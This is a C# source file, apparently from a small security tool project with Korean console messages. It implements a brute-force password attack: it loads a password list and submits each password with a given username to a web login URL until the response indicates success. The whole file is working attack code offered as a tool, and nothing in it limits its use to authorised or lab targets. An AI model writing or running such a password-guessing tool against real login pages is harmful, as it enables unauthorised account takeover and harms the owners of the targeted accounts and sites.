using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using static Sevz.Models.info;

namespace Sevz.Services
{
    public static class BruteforceAttack
    {
        public static async Task PerformBruteforceAttack(string loginUrl, string username)
        {
            // Load passwords from the passwordex.json file
            List<string> passwordList = PasswordManager.LoadPasswords();

            Console.WriteLine("Brute force 공격을 시작합니다...");

            using (HttpClient client = new HttpClient())
            {
                foreach (var password in passwordList)
                {
                    Console.WriteLine($"시도 중: {password}");

                    // Create the form data (username and password)
                    var formData = new Dictionary<string, string>
                {
                    { "username", username },
                    { "password", password }
                };

                    // POST request to the login URL
                    var response = await client.PostAsync(loginUrl, new FormUrlEncodedContent(formData));
                    var responseBody = await response.Content.ReadAsStringAsync();

                    // Simulate delay (optional)
                    await Task.Delay(500);

                    // Check if the response contains a success message
                    if (responseBody.Contains("로그인 성공") || responseBody.Contains("Welcome"))
                    {
                        Console.WriteLine($"비밀번호 찾음: {password}");
                        return;
                    }
                    else
                    {
                        Console.WriteLine($"비밀번호 실패: {password}");
                    }
                }
            }

            Console.WriteLine("일치하는 비밀번호를 찾지 못했습니다.");
        }
    }
}
